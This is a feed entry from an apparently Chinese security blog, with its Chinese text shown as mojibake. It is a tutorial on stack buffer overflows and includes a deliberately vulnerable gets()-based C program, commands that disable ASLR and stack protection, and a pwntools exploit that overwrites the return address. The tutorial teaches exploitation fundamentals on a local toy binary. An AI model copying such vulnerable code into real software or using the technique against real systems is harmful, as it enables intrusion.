<h1 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h1><p>æ ˆæº¢å‡ºæŒ‡çš„æ˜¯ç¨‹åºå‘æ ˆä¸­æŸä¸ªå˜é‡ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªå˜é‡æœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› è€Œå¯¼è‡´ä¸å…¶ç›¸é‚»çš„æ ˆä¸­çš„å˜é‡çš„å€¼è¢«æ”¹å˜ã€‚è¿™ç§é—®é¢˜æ˜¯ä¸€ç§ç‰¹å®šçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œç±»ä¼¼çš„è¿˜æœ‰å †æº¢å‡ºï¼Œbss æ®µæº¢å‡ºç­‰æº¢å‡ºæ–¹å¼ã€‚æ ˆæº¢å‡ºæ¼æ´è½»åˆ™å¯ä»¥ä½¿ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿä¸éš¾å‘ç°ï¼Œå‘ç”Ÿæ ˆæº¢å‡ºçš„åŸºæœ¬å‰ææ˜¯</p>
<ul>
<li>ç¨‹åºå¿…é¡»å‘æ ˆä¸Šå†™å…¥æ•°æ®ã€‚</li>
<li>å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶ã€‚</li>
</ul>
<h1 id="åŸºæœ¬ç¤ºä¾‹"><a href="#åŸºæœ¬ç¤ºä¾‹" class="headerlink" title="åŸºæœ¬ç¤ºä¾‹"></a>åŸºæœ¬ç¤ºä¾‹</h1><p>æœ€å…¸å‹çš„æ ˆæº¢å‡ºåˆ©ç”¨æ˜¯è¦†ç›–ç¨‹åºçš„è¿”å›åœ°å€ä¸ºæ”»å‡»è€…æ‰€æ§åˆ¶çš„åœ°å€ï¼Œ<strong>å½“ç„¶éœ€è¦ç¡®ä¿è¿™ä¸ªåœ°å€æ‰€åœ¨çš„æ®µå…·æœ‰å¯æ‰§è¡Œæƒé™</strong>ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>è¿™ä¸ªç¨‹åºçš„ä¸»è¦ç›®çš„è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è¾“å‡ºã€‚<strong>æˆ‘ä»¬å¸Œæœ›å¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œ success å‡½æ•°ã€‚</strong></p>
<p>æˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹å‘½ä»¤å¯¹å…¶è¿›è¡Œç¼–è¯‘</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">âœ  <span class="built_in">stack</span>-example gcc -m32 -fno-<span class="built_in">stack</span>-protector stack_example.c -o stack_example </span><br><span class="line">stack_example.c: In function â€˜vulnerableâ€™:</span><br><span class="line">stack_example.c:<span class="number">6</span>:<span class="number">3</span>: warning: implicit declaration of function â€˜getsâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^</span><br><span class="line">/tmp/ccPU8rRA.oï¼šåœ¨å‡½æ•°â€˜vulnerableâ€™ä¸­ï¼š</span><br><span class="line">stack_example.c:(.text+<span class="number">0x27</span>): è­¦å‘Šï¼š the `gets<span class="number">&#x27;</span> function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>


<p>å¯ä»¥çœ‹å‡º gets æœ¬èº«æ˜¯ä¸€ä¸ªå±é™©å‡½æ•°ã€‚å®ƒä»ä¸æ£€æŸ¥è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œæ˜¯ä»¥å›è½¦æ¥åˆ¤æ–­è¾“å…¥æ˜¯å¦ç»“æŸï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å¯ä»¥å¯¼è‡´æ ˆæº¢å‡º</p>
<blockquote>
<p>å†å²ä¸Šï¼Œ<strong>è«é‡Œæ–¯è •è™«</strong>ç¬¬ä¸€ç§è •è™«ç—…æ¯’å°±åˆ©ç”¨äº† gets è¿™ä¸ªå±é™©å‡½æ•°å®ç°äº†æ ˆæº¢å‡ºã€‚</p>
</blockquote>
<p>gcc ç¼–è¯‘æŒ‡ä»¤ä¸­ï¼Œ<code>-m32</code> æŒ‡çš„æ˜¯ç”Ÿæˆ 32 ä½ç¨‹åºï¼› <code>-fno-stack-protector</code> æŒ‡çš„æ˜¯ä¸å¼€å¯å †æ ˆæº¢å‡ºä¿æŠ¤ï¼Œå³ä¸ç”Ÿæˆ canaryã€‚ æ­¤å¤–ï¼Œä¸ºäº†æ›´åŠ æ–¹ä¾¿åœ°ä»‹ç»æ ˆæº¢å‡ºçš„åŸºæœ¬åˆ©ç”¨æ–¹å¼ï¼Œè¿™é‡Œè¿˜éœ€è¦å…³é—­ PIEï¼ˆPosition Independent Executableï¼‰ï¼Œé¿å…åŠ è½½åŸºå€è¢«æ‰“ä¹±ã€‚ä¸åŒ gcc ç‰ˆæœ¬å¯¹äº PIE çš„é»˜è®¤é…ç½®ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤<code>gcc -v</code>æŸ¥çœ‹ gcc é»˜è®¤çš„å¼€å…³æƒ…å†µã€‚å¦‚æœå«æœ‰<code>--enable-default-pie</code>å‚æ•°åˆ™ä»£è¡¨ PIE é»˜è®¤å·²å¼€å¯ï¼Œéœ€è¦åœ¨ç¼–è¯‘æŒ‡ä»¤ä¸­æ·»åŠ å‚æ•°<code>-no-pie</code>ã€‚</p>
<p>ç¼–è¯‘æˆåŠŸåï¼Œå¯ä»¥ä½¿ç”¨ checksec å·¥å…·æ£€æŸ¥ç¼–è¯‘å‡ºçš„æ–‡ä»¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">âœ  <span class="built_in">stack</span>-example checksec stack_example</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>


<p>æåˆ°ç¼–è¯‘æ—¶çš„ PIE ä¿æŠ¤ï¼ŒLinux å¹³å°ä¸‹è¿˜æœ‰åœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ï¼ˆASLRï¼‰çš„æœºåˆ¶ã€‚ç®€å•æ¥è¯´å³ä½¿å¯æ‰§è¡Œæ–‡ä»¶å¼€å¯äº† PIE ä¿æŠ¤ï¼Œè¿˜éœ€è¦ç³»ç»Ÿå¼€å¯ ASLR æ‰ä¼šçœŸæ­£æ‰“ä¹±åŸºå€ï¼Œå¦åˆ™ç¨‹åºè¿è¡Œæ—¶ä¾æ—§ä¼šåœ¨åŠ è½½ä¸€ä¸ªå›ºå®šçš„åŸºå€ä¸Šï¼ˆä¸è¿‡å’Œ No PIE æ—¶åŸºå€ä¸åŒï¼‰ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ <code>/proc/sys/kernel/randomize_va_space</code> æ¥æ§åˆ¶ ASLR å¯åŠ¨ä¸å¦ï¼Œå…·ä½“çš„é€‰é¡¹æœ‰ï¼š</p>
<ul>
<li>0ï¼Œå…³é—­ ASLRï¼Œæ²¡æœ‰éšæœºåŒ–ã€‚æ ˆã€å †ã€.so çš„åŸºåœ°å€æ¯æ¬¡éƒ½ç›¸åŒã€‚</li>
<li>1ï¼Œæ™®é€šçš„ ASLRã€‚æ ˆåŸºåœ°å€ã€mmap åŸºåœ°å€ã€.so åŠ è½½åŸºåœ°å€éƒ½å°†è¢«éšæœºåŒ–ï¼Œä½†æ˜¯å †åŸºåœ°å€æ²¡æœ‰éšæœºåŒ–ã€‚</li>
<li>2ï¼Œå¢å¼ºçš„ ASLRï¼Œåœ¨ 1 çš„åŸºç¡€ä¸Šï¼Œå¢åŠ äº†å †åŸºåœ°å€éšæœºåŒ–ã€‚</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>å…³é—­ Linux ç³»ç»Ÿçš„ ASLRï¼Œç±»ä¼¼çš„ï¼Œä¹Ÿå¯ä»¥é…ç½®ç›¸åº”çš„å‚æ•°ã€‚</p>
<p>ä¸ºäº†é™ä½åç»­æ¼æ´åˆ©ç”¨å¤æ‚åº¦ï¼Œæˆ‘ä»¬è¿™é‡Œå…³é—­ ASLRï¼Œåœ¨ç¼–è¯‘æ—¶å…³é—­ PIEã€‚å½“ç„¶è¯»è€…ä¹Ÿå¯ä»¥å°è¯• ASLRã€PIE å¼€å…³çš„ä¸åŒç»„åˆï¼Œé…åˆ IDA åŠå…¶åŠ¨æ€è°ƒè¯•åŠŸèƒ½è§‚å¯Ÿç¨‹åºåœ°å€å˜åŒ–æƒ…å†µï¼ˆåœ¨ ASLR å…³é—­ã€PIE å¼€å¯æ—¶ä¹Ÿå¯ä»¥æ”»å‡»æˆåŠŸï¼‰ã€‚</p>
<p>ç¡®è®¤æ ˆæº¢å‡ºå’Œ PIE ä¿æŠ¤å…³é—­åï¼Œæˆ‘ä»¬åˆ©ç”¨ IDA æ¥åç¼–è¯‘ä¸€ä¸‹äºŒè¿›åˆ¶ç¨‹åºå¹¶æŸ¥çœ‹ vulnerable å‡½æ•° ã€‚å¯ä»¥çœ‹åˆ°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>è¯¥å­—ç¬¦ä¸²è·ç¦» ebp çš„é•¿åº¦ä¸º 0x14ï¼Œé‚£ä¹ˆç›¸åº”çš„æ ˆç»“æ„ä¸º</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>


<p>å¹¶ä¸”ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ IDA è·å¾— success çš„åœ°å€ï¼Œå…¶åœ°å€ä¸º 0x0804843Bã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0804843B</span> success         proc near</span><br><span class="line">.text:<span class="number">0804843B</span>                 push    ebp</span><br><span class="line">.text:<span class="number">0804843</span>C                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804843</span>E                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048441</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048444</span>                 push    offset s        ; <span class="string">&quot;You Hava already controlled it.&quot;</span></span><br><span class="line">.text:<span class="number">08048449</span>                 call    _puts</span><br><span class="line">.text:<span class="number">0804844</span>E                 add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048451</span>                 nop</span><br><span class="line">.text:<span class="number">08048452</span>                 leave</span><br><span class="line">.text:<span class="number">08048453</span>                 retn</span><br><span class="line">.text:<span class="number">08048453</span> success         endp</span><br></pre></td></tr></table></figure>


<p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬è¯»å–çš„å­—ç¬¦ä¸²ä¸º</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x14</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;bbbb&#x27;</span>+success_addr</span><br></pre></td></tr></table></figure>


<p>é‚£ä¹ˆï¼Œç”±äº gets ä¼šè¯»åˆ°å›è½¦æ‰ç®—ç»“æŸï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¯»å–æ‰€æœ‰çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”å°† saved ebp è¦†ç›–ä¸º bbbbï¼Œå°† retaddr è¦†ç›–ä¸º success_addrï¼Œå³ï¼Œæ­¤æ—¶çš„æ ˆç»“æ„ä¸º</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    <span class="number">0x0804843B</span>   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>


<p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºåœ¨è®¡ç®—æœºå†…å­˜ä¸­ï¼Œæ¯ä¸ªå€¼éƒ½æ˜¯æŒ‰ç…§å­—èŠ‚å­˜å‚¨çš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯é‡‡ç”¨å°ç«¯å­˜å‚¨ï¼Œå³ 0x0804843B åœ¨å†…å­˜ä¸­çš„å½¢å¼æ˜¯</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\x3b\x84\x04\x08</span><br></pre></td></tr></table></figure>


<p>ä½†æ˜¯ï¼Œæˆ‘ä»¬åˆä¸èƒ½ç›´æ¥åœ¨ç»ˆç«¯å°†è¿™äº›å­—ç¬¦ç»™è¾“å…¥è¿›å»ï¼Œåœ¨ç»ˆç«¯è¾“å…¥çš„æ—¶å€™ \ï¼Œx ç­‰ä¹Ÿç®—ä¸€ä¸ªå•ç‹¬çš„å­—ç¬¦ã€‚ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å°† \x3b ä½œä¸ºä¸€ä¸ªå­—ç¬¦è¾“å…¥è¿›å»ã€‚é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ä¸€æ³¢ pwntools äº† (å…³äºå¦‚ä½•å®‰è£…ä»¥åŠåŸºæœ¬ç”¨æ³•ï¼Œè¯·è‡ªè¡Œ github)ï¼Œè¿™é‡Œåˆ©ç”¨ pwntools çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># æ„é€ ä¸ç¨‹åºäº¤äº’çš„å¯¹è±¡</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment"># æ„é€ payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment"># å‘ç¨‹åºå‘é€å­—ç¬¦ä¸²</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># å°†ä»£ç äº¤äº’è½¬æ¢ä¸ºæ‰‹å·¥äº¤äº’</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


<p>æ‰§è¡Œä¸€æ³¢ä»£ç ï¼Œå¯ä»¥å¾—åˆ°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">âœ  <span class="built_in">stack</span>-example python <span class="built_in">exp</span>.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./stack_example&#x27;</span>: pid <span class="number">61936</span></span><br><span class="line">;\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process <span class="string">&#x27;./stack_example&#x27;</span> stopped with <span class="built_in">exit</span> code <span class="number">-11</span> (SIGSEGV) (pid <span class="number">61936</span>)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending in interactive</span><br></pre></td></tr></table></figure>


<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç¡®å®å·²ç»æ‰§è¡Œ success å‡½æ•°ã€‚</p>
<h1 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h1><p>ä¸Šé¢çš„ç¤ºä¾‹å…¶å®ä¹Ÿå±•ç¤ºäº†æ ˆæº¢å‡ºä¸­æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªæ­¥éª¤ã€‚</p>
<h3 id="å¯»æ‰¾å±é™©å‡½æ•°"><a href="#å¯»æ‰¾å±é™©å‡½æ•°" class="headerlink" title="å¯»æ‰¾å±é™©å‡½æ•°"></a>å¯»æ‰¾å±é™©å‡½æ•°</h3><p>é€šè¿‡å¯»æ‰¾å±é™©å‡½æ•°ï¼Œæˆ‘ä»¬å¿«é€Ÿç¡®å®šç¨‹åºæ˜¯å¦å¯èƒ½æœ‰æ ˆæº¢å‡ºï¼Œä»¥åŠæœ‰çš„è¯ï¼Œæ ˆæº¢å‡ºçš„ä½ç½®åœ¨å“ªé‡Œã€‚å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹</p>
<ul>
<li>è¾“å…¥<ul>
<li>getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥â€™\x00â€™</li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>è¾“å‡º<ul>
<li>sprintf</li>
</ul>
</li>
<li>å­—ç¬¦ä¸²<ul>
<li>strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ°â€™\x00â€™åœæ­¢</li>
<li>strcatï¼Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ°â€™\x00â€™åœæ­¢</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h3 id="ç¡®å®šå¡«å……é•¿åº¦"><a href="#ç¡®å®šå¡«å……é•¿åº¦" class="headerlink" title="ç¡®å®šå¡«å……é•¿åº¦"></a>ç¡®å®šå¡«å……é•¿åº¦</h3><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è®¡ç®—<strong>æˆ‘ä»¬æ‰€è¦æ“ä½œçš„åœ°å€ä¸æˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€çš„è·ç¦»</strong>ã€‚å¸¸è§çš„æ“ä½œæ–¹æ³•å°±æ˜¯æ‰“å¼€ IDAï¼Œæ ¹æ®å…¶ç»™å®šçš„åœ°å€è®¡ç®—åç§»ã€‚ä¸€èˆ¬å˜é‡ä¼šæœ‰ä»¥ä¸‹å‡ ç§ç´¢å¼•æ¨¡å¼</p>
<ul>
<li>ç›¸å¯¹äºæ ˆåŸºåœ°å€çš„çš„ç´¢å¼•ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æŸ¥çœ‹ EBP ç›¸å¯¹åç§»è·å¾—</li>
<li>ç›¸å¯¹åº”æ ˆé¡¶æŒ‡é’ˆçš„ç´¢å¼•ï¼Œä¸€èˆ¬éœ€è¦è¿›è¡Œè°ƒè¯•ï¼Œä¹‹åè¿˜æ˜¯ä¼šè½¬æ¢åˆ°ç¬¬ä¸€ç§ç±»å‹ã€‚</li>
<li>ç›´æ¥åœ°å€ç´¢å¼•ï¼Œå°±ç›¸å½“äºç›´æ¥ç»™å®šäº†åœ°å€ã€‚</li>
</ul>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¼šæœ‰å¦‚ä¸‹çš„è¦†ç›–éœ€æ±‚</p>
<ul>
<li><strong>è¦†ç›–å‡½æ•°è¿”å›åœ°å€</strong>ï¼Œè¿™æ—¶å€™å°±æ˜¯ç›´æ¥çœ‹ EBP å³å¯ã€‚</li>
<li><strong>è¦†ç›–æ ˆä¸ŠæŸä¸ªå˜é‡çš„å†…å®¹</strong>ï¼Œè¿™æ—¶å€™å°±éœ€è¦æ›´åŠ ç²¾ç»†çš„è®¡ç®—äº†ã€‚</li>
<li><strong>è¦†ç›– bss æ®µæŸä¸ªå˜é‡çš„å†…å®¹</strong>ã€‚</li>
<li>æ ¹æ®ç°å®æ‰§è¡Œæƒ…å†µï¼Œè¦†ç›–ç‰¹å®šçš„å˜é‡æˆ–åœ°å€çš„å†…å®¹ã€‚</li>
</ul>
<p>ä¹‹æ‰€ä»¥æˆ‘ä»¬æƒ³è¦è¦†ç›–æŸä¸ªåœ°å€ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æƒ³é€šè¿‡è¦†ç›–åœ°å€çš„æ–¹æ³•æ¥<strong>ç›´æ¥æˆ–è€…é—´æ¥åœ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹</strong>ã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownjBQdLcvCeyPfIi8.png"></p>
<p>è¿è¡Œæ—¶ç¨‹åºçš„æ ˆï¼š<br>ä¸Šé¢é«˜åœ°å€å¤„å­˜æ”¾çš„æ˜¯ç¯å¢ƒå˜é‡å’Œmainå‡½æ•°çš„ä¿¡æ¯<br>å¾€ä¸‹æ˜¯ä¸»è°ƒå‡½æ•°çš„æ ˆå†…å­˜ï¼ŒåŒ…æ‹¬ä¸´æ—¶å˜é‡å’Œæ§åˆ¶ä¿¡æ¯ï¼ˆæ§åˆ¶ä¿¡æ¯åŒ…æ‹¬è¿”å›åœ°å€å’Œebpç­‰ç”¨æ¥ä¿å­˜çš„å¯„å­˜å™¨çš„å€¼ï¼‰</p>
<p>è°ƒç”¨çº¦å®šï¼š<br>æ¯ä¸ªå‡½æ•°è°ƒç”¨çš„æ—¶å€™éƒ½ä¼šè‡ªå·±å¹³è¡¡è‡ªå·±çš„å †æ ˆã€‚</p>
<p>æ¯ä¸ªè¢«è°ƒå‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™å…ˆpushã€€ebpæ‰€ä»¥æ ˆé‡Œé¢ä¼šæœ‰è¿”å›åœ°å€å’Œebp</p>
<h2 id="ä¸¤ä¸ªè¡¨"><a href="#ä¸¤ä¸ªè¡¨" class="headerlink" title="ä¸¤ä¸ªè¡¨"></a><strong>ä¸¤ä¸ªè¡¨</strong></h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownnbq1cslCgh27owZ.png"></p>
<ul>
<li>å…¨å±€åç§»è¡¨<code>ï¼ˆGOTï¼šGlobal Offset Tableï¼‰</code>å­˜æ”¾å¤–éƒ¨çš„å‡½æ•°åœ°å€</li>
<li>ç¨‹åºé“¾æ¥è¡¨<code>ï¼ˆPLTï¼šProcedure Link Tableï¼‰</code>å­˜æ”¾é¢å¤–ä»£ç </li>
</ul>
<p>pltè¡¨ï¼šå‡½æ•°è°ƒç”¨çš„æ—¶å€™å…ˆä½¿ç”¨çš„ã€‚<strong>PLTè¡¨ä¸­çš„æ¯ä¸€é¡¹çš„-æ•°æ®å†…å®¹éƒ½æ˜¯å¯¹åº”çš„GOTè¡¨ä¸­ä¸€é¡¹çš„åœ°å€è¿™ä¸ªæ˜¯å›ºå®šä¸å˜çš„</strong>ï¼Œ<strong>PLTè¡¨ä¸­çš„æ•°æ®æ˜¯è·³è½¬åˆ°GOTè¡¨é¡¹çš„åœ°å€</strong>ã€‚  </p>
<p>gotè¡¨ï¼šä¸€ä¸ªæŒ‡å‘çœŸæ­£è¿è¡Œå‡½æ•°é¦–åœ°å€çš„æŒ‡é’ˆã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>å‡½æ•°</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">é‡åˆ°ç©ºæ ¼(<span class="number">0x20</span>)åœæ­¢è¯»å–</span><br><span class="line"></span><br><span class="line">readå‡½æ•°</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span>  <span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line">è¯»å–æ•°æ®é‡åˆ°\n(<span class="number">0x0a</span>)ç»“æŸï¼Œ\x0aä¼šè¯»è¿›å»</span><br><span class="line">fdä¸º<span class="number">0</span>ä»é”®ç›˜è¯»å–</span><br><span class="line"></span><br><span class="line">getså‡½æ•°</span><br><span class="line">gets(str);</span><br><span class="line">è¾“å…¥é‡åˆ°\n(<span class="number">0x0a</span>)ç»“æŸ</span><br><span class="line">\x0aä¸ä¼šè¯»è¿›å»</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>å‡½æ•°</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, i);</span><br><span class="line">è¾“å‡ºç›´åˆ°\x00</span><br><span class="line"></span><br><span class="line">writeå‡½æ•°</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> nbyte)</span>;</span><br><span class="line">fdä¸º<span class="number">1</span>è¾“å‡ºåˆ°æ˜¾ç¤ºå™¨</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>å‡½æ•°</span><br><span class="line"><span class="built_in">puts</span>(<span class="type">char</span> *)</span><br><span class="line">ç›¸å½“äº<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s)</span><br><span class="line">è¾“å‡ºå­—ç¬¦ä¸²ï¼ˆé‡åˆ°\x00ç»“æŸï¼‰</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>å‡½æ•°</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br><span class="line">ä¸€ç›´å¤åˆ¶ç›´åˆ°é‡åˆ°\x00</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>å‡½æ•°</span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br><span class="line">å¤åˆ¶ä»»æ„å†…å®¹</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>å‡½æ•°</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src,<span class="type">int</span> <span class="type">size_t</span> n)</span>;</span><br><span class="line">å¦‚æœn&lt;srcçš„é•¿åº¦ï¼Œåªæ˜¯å°†srcçš„å‰nä¸ªå­—ç¬¦å¤åˆ¶åˆ°destçš„å‰nä¸ªå­—ç¬¦ï¼Œä¸è‡ªåŠ¨æ·»åŠ <span class="string">&#x27;\0&#x27;</span>ã€‚å¦‚æœsrcçš„é•¿åº¦å°äºnä¸ªå­—èŠ‚ï¼Œåˆ™ä»¥<span class="literal">NULL</span>å¡«å……destç›´åˆ°å¤åˆ¶å®Œnä¸ªå­—èŠ‚</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶å®‰å…¨</category>
      </categories>
      <tags>
        <tag>æ ˆæº¢å‡º</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowå‘½ä»¤æ‰§è¡Œ</title>
    <url>/WP/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
